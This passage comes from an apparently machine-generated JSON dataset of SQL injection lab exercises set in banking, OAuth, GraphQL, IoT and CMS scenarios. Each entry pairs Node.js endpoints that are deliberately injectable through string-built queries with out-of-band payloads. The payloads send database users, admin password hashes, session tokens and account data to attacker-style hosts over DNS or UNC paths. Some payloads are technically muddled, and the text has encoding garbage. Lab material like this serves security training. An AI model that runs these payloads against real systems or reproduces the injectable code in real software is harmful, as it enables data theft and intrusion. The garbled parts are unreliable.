    "Lab Description": "The e-commerce OAuth introspection endpoint is vulnerable to SQL Injection due to unsafe handling of access token input. Attackers can inject payloads that initiate DNS-based OOB data exfiltration during token validation. Solve this lab by forging a malicious token that causes the server to leak the database name over DNS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Host a DNS listener service (e.g., Burp Collaborator).",
      "Craft a fake access token containing a SQL Injection OOB payload.",
      "POST the token to the introspection endpoint.",
      "Capture the outgoing DNS query containing the database name."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "router.post('/oauth/introspect', (req, res) => {\n  const token = req.body.token;\n  const query = `SELECT * FROM tokens WHERE token = '${token}'`;\n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Invalid token');\n    else res.json({ active: results.length > 0 });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.oob.attacker.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\dbdump'--"
    ]
  },
  {
    "Lab scenario": "Education Platform GraphQL API - Advanced Argument OOB SQL Injection",
    "Lab Description": "The 'userProfile' query in a GraphQL API dynamically builds SQL statements from user input without sanitization. Attackers can exploit this to inject SQL payloads causing OOB DNS interactions, leaking sensitive user credentials. Solve this lab by leaking the admin\u00e2\u20ac\u2122s hashed password via an OOB DNS payload injected through GraphQL.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze GraphQL query structure and parameters.",
      "Send a malicious GraphQL query injecting a DNS-triggered SQL payload.",
      "Monitor for OOB DNS interaction leaking the admin's password hash.",
      "Verify the leaked hash to complete the lab."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "const resolvers = {\n  Query: {\n    userProfile: (parent, args) => {\n      const userId = args.id;\n      const sql = `SELECT * FROM users WHERE id = '${userId}'`;\n      return db.query(sql);\n    }\n  }\n};",
    "payloads": [
      "{ userProfile(id: \"1' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE role='admin'),'.oob.attacker.com\\\\'))--\") { name } }",
      "{ userProfile(id: \"1'; SELECT LOAD_FILE(CONCAT('\\\\',user(),'oob.attacker.com\\\\'))--\") { name } }"
    ]
  },
  {
    "Lab scenario": "IoT Device Management - OOB SQL Injection via Device Registration",
    "Lab Description": "An IoT device registration API accepts device names and directly interpolates them into SQL INSERT statements. Attackers can inject payloads triggering DNS lookups or HTTP callbacks to exfiltrate data over OOB channels. To solve: Trigger a DNS exfiltration attack and leak database user info.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Setup Burp Collaborator or DNSbin for OOB interaction capture",
      "Register a new IoT device with a malicious SQL payload causing DNS lookup",
      "Monitor incoming DNS requests to verify OOB injection success",
      "Extract database username or internal hostnames via exfiltrated payloads"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/register-device', (req, res) => {\n  const deviceName = req.body.deviceName;\n  const sql = `INSERT INTO devices (device_name) VALUES ('${deviceName}')`;\n  db.query(sql, (err) => {\n    if (err) res.status(500).send('Registration failed');\n    else res.send('Device registered');\n  });\n});",
    "payloads": [
      "'; SELECT load_file('\\\\attacker-server.dnslog.domain\\\\abc')--",
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.dnslog.domain\\\\a'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.dnslog.domain\\\\data'--"
    ]
  },
  {
    "Lab scenario": "Banking OAuth Endpoint - SQL Injection with Access Token Pivot to OOB",
    "Lab Description": "The OAuth token introspection endpoint constructs SQL queries using unsanitized token IDs. Exploiting this, attackers inject OOB payloads during token validation and exfiltrate sensitive banking data. To solve: Submit a malicious access token to trigger an OOB DNS lookup revealing bank admin credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Setup an OOB interaction server (Burp Collaborator, interact.sh)",
      "Forge a fake access token containing a malicious SQL payload",
      "Submit the token to the OAuth introspection endpoint",
      "Capture OOB DNS traffic leaking bank usernames/passwords"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.post('/oauth/introspect', (req, res) => {\n  const token = req.body.token;\n  const sql = `SELECT * FROM tokens WHERE token_id = '${token}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Token validation failed');\n    else res.json({ active: result.length > 0 });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT email FROM users WHERE role='admin'),'.oob-server.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob-server.com\\\\dump'--",
      "'; SELECT user() INTO OUTFILE '\\\\\\\\attacker.oob-server.com\\\\user'--"
    ]
  },
  {
    "Lab scenario": "GraphQL User Profile API - OOB SQLi via Argument Injection",
    "Lab Description": "The GraphQL 'userProfile' query dynamically builds SQL queries using user arguments. Attackers craft arguments that trigger DNS callbacks, leaking sensitive fields like password hashes through OOB channels. To solve: Perform GraphQL-based OOB SQL injection and leak the password hash of the admin account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze GraphQL schema and locate user-controlled fields",
      "Submit malicious arguments with DNS exfiltration SQL payloads",
      "Monitor OOB traffic to extract leaked hash information",
      "Reconstruct login credentials using exfiltrated data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const resolvers = {\n  Query: {\n    userProfile: (parent, args) => {\n      const id = args.id;\n      const query = `SELECT * FROM users WHERE id = '${id}'`;\n      return db.query(query);\n    }\n  }\n};",
    "payloads": [
      "{ userProfile(id: \"1' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE role='admin'),'.oob-server.com\\\\'))--\") { name } }",
      "{ userProfile(id: \"1'; SELECT SLEEP(5)--\") { name } }",
      "{ userProfile(id: \"1'; SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob-server.com\\\\output'--\") { name } }"
    ]
  },
  {
    "Lab scenario": "CMS Admin Panel - OOB SQL Injection via File Upload Metadata",
    "Lab Description": "The CMS's file upload functionality saves metadata like 'title' directly into database queries without validation. Attackers can upload a file with a malicious title triggering OOB SQL queries to leak admin session tokens. To solve: Upload a poisoned file to trigger an OOB attack and capture session tokens.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Create a file with a crafted filename or metadata field containing OOB SQL payloads",
      "Upload the file to the CMS admin panel",
      "Capture OOB DNS or HTTP interactions leaking admin session tokens",
      "Use the leaked session token to hijack admin access"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/admin/upload', upload.single('file'), (req, res) => {\n  const title = req.body.title;\n  const sql = `INSERT INTO uploads (filename, title) VALUES ('${req.file.filename}', '${title}')`;\n  db.query(sql, (err) => {\n    if (err) res.status(500).send('Upload error');\n    else res.send('File uploaded');\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT session_token FROM sessions WHERE user_role='admin'),'.oob-attack.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob-attack.com\\\\session'--",
      "'; SELECT @@hostname INTO OUTFILE '\\\\\\\\attacker.oob-attack.com\\\\host'--"
    ]
  },
  {
    "Lab scenario": "Online Education Platform - OOB SQL Injection via Search Suggestions",
    "Lab Description": "The online education platform provides dynamic course search suggestions. The search term is inserted unsafely into SQL LIKE queries. Attackers can craft payloads to cause DNS lookups that leak database version and admin emails. To solve: Inject OOB payloads via the search feature to leak sensitive backend details.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit search terms containing DNS exfiltration SQL payloads",
      "Capture OOB interactions from the education platform's backend",
      "Extract database version and admin email addresses",
      "Leverage information for deeper platform compromise"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "router.get('/api/search', (req, res) => {\n  const q = req.query.q;\n  const sql = `SELECT course_id, course_title FROM courses WHERE course_title LIKE '%${q}%'`;\n  db.query(sql, (err, results) => {\n    if (err) res.status(400).send('Search error');\n    else res.json(results);\n  });\n});",
    "payloads": [
      "%'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.oob.education.com\\\\'))--",
      "%'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT email FROM users WHERE role='admin'),'.oob.education.com\\\\'))--",
      "%'; SELECT @@version_compile_os INTO OUTFILE '\\\\\\\\attacker.oob-server.com\\\\osinfo'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - Basic SQL Injection in Account Balance Endpoint",
    "Lab Description": "The banking portal's account balance endpoint directly inserts user-supplied account IDs into an SQL query without sanitization. Attackers can inject malicious SQL code that causes an OOB DNS request, exfiltrating sensitive data like the database's user credentials. Solve this by crafting a payload that triggers the DNS exfiltration of the database user.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set up an OOB capture service (e.g., Burp Collaborator).",
      "Submit a crafted account ID value that triggers a DNS lookup.",
      "Monitor the OOB traffic for database username exfiltration.",
      "Confirm successful data extraction."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/account/balance', (req, res) => {\n  const accountId = req.query.accountId;\n  const sql = `SELECT balance FROM accounts WHERE account_id = '${accountId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Database error');\n    else res.json({ balance: result[0].balance });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\dbuser'--"
    ]
  },
  {
    "Lab scenario": "Banking API - SQL Injection in Transaction History Endpoint",
    "Lab Description": "The banking API's transaction history endpoint dynamically constructs SQL queries using unvalidated user inputs. Attackers can inject SQL payloads to trigger OOB DNS lookups, potentially leaking sensitive transaction data. Solve this lab by injecting a payload that causes a DNS request to exfiltrate transaction details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Configure an OOB listener (Burp Collaborator or interact.sh).",
      "Send a crafted request to the transaction history endpoint with a malicious SQL payload.",
      "Monitor DNS interactions for exfiltrated transaction data.",
      "Retrieve and verify sensitive data exfiltration."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/api/transactions', (req, res) => {\n  const accountId = req.query.accountId;\n  const sql = `SELECT * FROM transactions WHERE account_id = '${accountId}'`;\n  db.query(sql, (err, results) => {\n    if (err) res.status(400).send('Transaction retrieval error');\n    else res.json(results);\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT transaction_id FROM transactions WHERE account_id='1'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\transaction_details'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - Advanced SQL Injection with Account Number Validation",
    "Lab Description": "The banking portal\u00e2\u20ac\u2122s account number validation endpoint improperly sanitizes inputs. Attackers can inject OOB payloads, leading to the exfiltration of sensitive data like the bank's internal email addresses. Solve this lab by injecting a payload that triggers an OOB DNS request and leaks the bank\u00e2\u20ac\u2122s internal admin email address.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set up a DNS OOB server to capture interactions.",
      "Inject an OOB payload through the account validation endpoint to trigger DNS exfiltration.",
      "Monitor DNS traffic for the leaked admin email.",
      "Confirm the success of data exfiltration and complete the lab."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/api/account/validate', (req, res) => {\n  const accountNumber = req.body.accountNumber;\n  const sql = `SELECT * FROM accounts WHERE account_number = '${accountNumber}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Validation failed');\n    else res.json({ valid: result.length > 0 });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT email FROM users WHERE role='admin'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\admin_email'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in User Login Endpoint",
    "Lab Description": "The banking portal\u00e2\u20ac\u2122s login endpoint improperly handles user inputs in the authentication query. Attackers can inject SQL payloads to bypass authentication, trigger OOB DNS requests, and exfiltrate sensitive user information. Solve this lab by injecting a payload that causes the database to leak the admin password hash through an OOB DNS query.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set up an OOB DNS listener (Burp Collaborator or interact.sh).",
      "Inject a basic SQL Injection payload into the username field to bypass login.",
      "Monitor OOB DNS queries for leaked admin credentials.",
      "Confirm successful exfiltration of admin password hash."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/api/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Login failed');\n    else res.json({ success: result.length > 0 });\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT 1, user(), database(), password FROM users WHERE role='admin' INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\admin_password'--"
    ]
  },
  {
    "Lab scenario": "Banking API - SQL Injection in Transfer Funds Endpoint",
    "Lab Description": "The banking API\u00e2\u20ac\u2122s fund transfer endpoint dynamically constructs SQL queries without sanitizing user inputs, allowing attackers to inject payloads. These payloads can be exploited to exfiltrate sensitive information, such as account numbers or balance information, through DNS-based OOB attacks. Solve this lab by injecting a malicious payload to leak database structure and account balances.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Configure an OOB DNS capture service (Burp Collaborator).",
      "Send a crafted request to the fund transfer endpoint with an injected SQL payload.",
      "Monitor for DNS queries from the server, retrieving sensitive account data.",
      "Verify successful data exfiltration and identify exposed account information."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/api/transfer', (req, res) => {\n  const fromAccount = req.body.fromAccount;\n  const toAccount = req.body.toAccount;\n  const amount = req.body.amount;\n  const sql = `INSERT INTO transactions (from_account, to_account, amount) VALUES ('${fromAccount}', '${toAccount}', '${amount}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transfer failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT table_name FROM information_schema.tables WHERE table_schema='banking'),'.oob.attacker.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\account_balance' FROM accounts--"
    ]
  },
  {
    "Lab scenario": "Banking Application - Advanced SQL Injection in Loan Approval API",
    "Lab Description": "The banking loan approval API fails to properly sanitize inputs. An attacker can inject complex SQL queries that bypass loan eligibility checks, and then trigger an OOB DNS request to leak sensitive financial data like loan applicant details. Solve this lab by injecting a payload that forces the application to leak internal financial information over DNS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set up a Burp Collaborator or other DNS OOB capture server.",
      "Inject a SQL payload into the loan approval API\u00e2\u20ac\u2122s user input field.",
      "Monitor for DNS interactions to exfiltrate loan applicant information.",
      "Verify successful data exfiltration and complete the lab."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/api/loan/approve', (req, res) => {\n  const applicantId = req.body.applicantId;\n  const sql = `SELECT * FROM loan_applications WHERE applicant_id = '${applicantId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Loan approval failed');\n    else res.json({ approved: result.length > 0 });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT concat(first_name, ' ', last_name) FROM loan_applications WHERE applicant_id='1'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\financial_data' FROM loan_applications WHERE status='approved'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Customer Feedback Submission",
    "Lab Description": "The customer feedback submission endpoint in the banking portal fails to sanitize inputs, allowing for SQL Injection attacks. By injecting SQL payloads, attackers can leak sensitive customer feedback data using DNS-based OOB requests. Solve this by injecting a payload to exfiltrate customer feedback data.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set up an OOB capture service (e.g., Burp Collaborator).",
      "Inject a simple SQL payload into the feedback form's text input field.",
      "Monitor OOB DNS requests for leaked customer feedback.",
      "Verify successful extraction of sensitive customer feedback data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/feedback/submit', (req, res) => {\n  const feedback = req.body.feedback;\n  const sql = `INSERT INTO feedback (content) VALUES ('${feedback}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Feedback submission failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT content FROM feedback WHERE customer_id='1'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\feedback_data'--"
    ]
  },
  {
    "Lab scenario": "Banking API - SQL Injection in Account Details Endpoint",
    "Lab Description": "The banking API exposes account details through an endpoint that constructs SQL queries directly from user input. Attackers can inject SQL payloads that allow OOB DNS exfiltration of account data. Solve this lab by injecting a payload to leak account details such as balance or transaction history via DNS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Configure Burp Collaborator or interact.sh as an OOB DNS capture tool.",
      "Inject a SQL payload into the account details API endpoint, targeting the account balance or transaction data.",
      "Monitor DNS traffic for data exfiltration from the server.",
      "Verify the successful leak of sensitive account information."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/api/account/details', (req, res) => {\n  const accountId = req.query.accountId;\n  const sql = `SELECT * FROM accounts WHERE account_id = '${accountId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Account details fetch failed');\n    else res.json(result[0]);\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT balance FROM accounts WHERE account_id='1'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\account_info'--"
    ]
  },
  {
    "Lab scenario": "Banking Application - SQL Injection in Fund Transfer Validation",
    "Lab Description": "The banking application allows users to transfer funds between accounts, but the transaction validation endpoint does not sanitize inputs. By injecting SQL payloads, attackers can cause the application to leak sensitive transaction data using OOB DNS requests. Solve this by injecting a payload that triggers DNS requests containing transaction details.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Configure an OOB listener (e.g., Burp Collaborator or interact.sh).",
      "Send a malicious fund transfer request to the API with SQL Injection payloads in the fields.",
      "Monitor DNS traffic for exfiltration of transaction details such as account numbers and amounts.",
      "Confirm successful exfiltration of transaction data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/api/transfer/validate', (req, res) => {\n  const fromAccount = req.body.fromAccount;\n  const toAccount = req.body.toAccount;\n  const amount = req.body.amount;\n  const sql = `SELECT * FROM transactions WHERE from_account = '${fromAccount}' AND to_account = '${toAccount}' AND amount = '${amount}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transaction validation failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT transaction_id FROM transactions WHERE amount='5000'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\fund_transfer_data'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Loan Application Search",
    "Lab Description": "The banking portal allows users to search for loan applications, but it constructs SQL queries based on user input without sanitization. Attackers can inject SQL payloads that result in DNS-based OOB data exfiltration of loan application information. Solve this lab by crafting a payload that leaks loan applicant data.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set up a DNS OOB listener (Burp Collaborator).",
      "Inject a SQL payload into the loan application search query.",
      "Monitor the DNS traffic for exfiltrated loan applicant data.",
      "Confirm the successful leak of applicant details like name and loan amount."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/loan/applications', (req, res) => {\n  const applicationId = req.query.applicationId;\n  const sql = `SELECT * FROM loan_applications WHERE application_id = '${applicationId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Loan application fetch failed');\n    else res.json(result[0]);\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT loan_amount FROM loan_applications WHERE application_id='1'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\loan_applicant_data'--"
    ]
  },
  {
    "Lab scenario": "Banking API - SQL Injection in Transaction Logs Retrieval",
    "Lab Description": "The banking API has an endpoint for retrieving transaction logs, but the endpoint is vulnerable to SQL Injection. Attackers can inject SQL payloads to extract sensitive transaction data, including amounts, account details, and dates, through DNS-based OOB requests. Solve this lab by injecting a payload to leak transaction logs.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Configure an OOB capture tool (Burp Collaborator).",
      "Send an injected SQL payload through the transaction logs retrieval API.",
      "Monitor the DNS traffic for exfiltrated transaction data.",
      "Verify that sensitive transaction data has been leaked."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/api/transactions/logs', (req, res) => {\n  const startDate = req.query.startDate;\n  const endDate = req.query.endDate;\n  const sql = `SELECT * FROM transaction_logs WHERE transaction_date BETWEEN '${startDate}' AND '${endDate}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transaction logs retrieval failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT transaction_date FROM transaction_logs WHERE amount='1000'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\transaction_log_data'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Loan Approval System",
    "Lab Description": "The banking portal contains a loan approval system that fails to sanitize user input in loan application forms. An attacker can inject SQL payloads into the loan amount or borrower ID fields. The attacker can exfiltrate sensitive loan data using OOB DNS requests. The goal is to craft a payload that exfiltrates loan approval data such as loan amounts and borrower names.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set up an OOB listener (e.g., Burp Collaborator).",
      "Inject a SQL payload into the loan approval form's fields (loan amount, borrower ID).",
      "Monitor DNS traffic for exfiltrated loan approval data.",
      "Verify successful exfiltration of loan approval details."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/loan/approve', (req, res) => {\n  const loanAmount = req.body.amount;\n  const borrowerId = req.body.borrowerId;\n  const sql = `SELECT * FROM loan_approvals WHERE loan_amount = '${loanAmount}' AND borrower_id = '${borrowerId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Loan approval failed');\n    else res.json(result[0]);\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT borrower_name FROM loan_approvals WHERE loan_amount='5000'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\loan_approval_data'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in User Profile Page",
    "Lab Description": "The banking portal's user profile page is vulnerable to SQL Injection through an unprotected user ID query. The user ID is used directly in the SQL query to retrieve the profile. Attackers can inject SQL to exfiltrate sensitive user data, such as account details and transaction history, via OOB DNS requests. The challenge is to craft an injection that leaks user profile data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set up an OOB DNS listener (Burp Collaborator).",
      "Inject a payload into the user profile page's user ID parameter.",
      "Monitor DNS traffic for exfiltrated data from the profile (e.g., account details, transaction history).",
      "Verify the successful leak of user data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/user/profile', (req, res) => {\n  const userId = req.query.userId;\n  const sql = `SELECT * FROM users WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Profile fetch failed');\n    else res.json(result[0]);\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT account_balance FROM users WHERE user_id='1'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\user_profile_data'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Transaction History",
    "Lab Description": "The banking portal allows users to view their transaction history, but fails to sanitize inputs. An attacker can inject SQL payloads into the request parameters, exfiltrating sensitive data (such as transaction IDs, amounts, and sender/receiver details) via OOB DNS requests. The task is to inject SQL payloads to exfiltrate the transaction history.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set up an OOB DNS capture service (Burp Collaborator).",
      "Send a crafted SQL payload to the transaction history API endpoint.",
      "Monitor DNS traffic for sensitive transaction data such as amounts, transaction IDs, and account details.",
      "Verify the successful exfiltration of sensitive transaction data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/transaction/history', (req, res) => {\n  const userId = req.query.userId;\n  const sql = `SELECT * FROM transactions WHERE user_id = '${userId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transaction history fetch failed');\n    else res.json(result); \n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT transaction_id FROM transactions WHERE amount='1000'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\transaction_history'--"
    ]
  },
  {
    "Lab scenario": "Banking API - SQL Injection in Account Balance API",
    "Lab Description": "The banking API exposes account balance data to users through an unprotected endpoint, where the account number is directly inserted into an SQL query. Attackers can use SQL injection to manipulate the query, causing the server to leak account balance information through DNS-based OOB exfiltration. The challenge is to craft a SQL injection payload to exfiltrate sensitive account balance information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set up an OOB DNS capture tool (Burp Collaborator).",
      "Inject SQL payloads into the account number parameter of the account balance API.",
      "Monitor DNS traffic for the leaked account balance.",
      "Verify that sensitive account information has been successfully exfiltrated."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/account/balance', (req, res) => {\n  const accountNumber = req.query.accountNumber;\n  const sql = `SELECT balance FROM accounts WHERE account_number = '${accountNumber}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Balance fetch failed');\n    else res.json(result[0]);\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT balance FROM accounts WHERE account_number='12345'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\account_balance'--"
    ]
  },
  {
    "Lab scenario": "Banking API - SQL Injection in Account Update Endpoint",
    "Lab Description": "The banking API has an endpoint for updating user account details, but fails to sanitize inputs. Attackers can inject SQL payloads into the update request, causing the server to leak sensitive information such as account number and user details through DNS-based OOB requests. The goal is to craft a SQL injection payload to leak account data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Configure an OOB listener (Burp Collaborator).",
      "Send a malicious request to the account update API endpoint with SQL payloads in the account number and user name fields.",
      "Monitor DNS traffic for exfiltrated account information.",
      "Verify the successful leak of account data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.put('/account/update', (req, res) => {\n  const accountNumber = req.body.accountNumber;\n  const userName = req.body.userName;\n  const sql = `UPDATE accounts SET user_name = '${userName}' WHERE account_number = '${accountNumber}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Account update failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user_name FROM accounts WHERE account_number='12345'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\account_update_data'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Account Creation",
    "Lab Description": "The banking portal allows new users to create accounts, but fails to sanitize input fields, making it vulnerable to SQL Injection. An attacker can inject SQL payloads into the username or password fields. The goal is to inject payloads that exfiltrate sensitive user data, such as newly created account details and passwords, via DNS-based OOB exfiltration.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Set up an OOB DNS listener (Burp Collaborator).",
      "Inject SQL payloads into the username and password fields during account creation.",
      "Monitor DNS traffic for exfiltrated account details.",
      "Verify the successful exfiltration of user account data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/account/create', (req, res) => {\n  const userName = req.body.username;\n  const password = req.body.password;\n  const sql = `INSERT INTO users (username, password) VALUES ('${userName}', '${password}')`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Account creation failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT username FROM users WHERE user_id='1'),'.oob.bank.com\\\\'))--",
      "' UNION SELECT 1 INTO OUTFILE '\\\\\\\\attacker.oob.com\\\\account_creation_data'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Loan Interest Calculation",
    "Lab Description": "The banking portal calculates loan interest using parameters submitted via the loan application form. The system is vulnerable to SQL Injection, allowing attackers to modify the query and leak interest rate calculations, loan amounts, and associated user data via OOB DNS requests. The goal is to inject a payload that exposes loan interest rates.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set up an OOB DNS listener (Burp Collaborator).",
      "Inject SQL payloads into the loan application form fields, particularly loan amount and interest rate parameters.",
      "Monitor DNS traffic for exfiltrated loan calculation data.",
      "Verify successful leakage of loan interest data."
    ],
    "Vulnerability name": "SQL Injection",
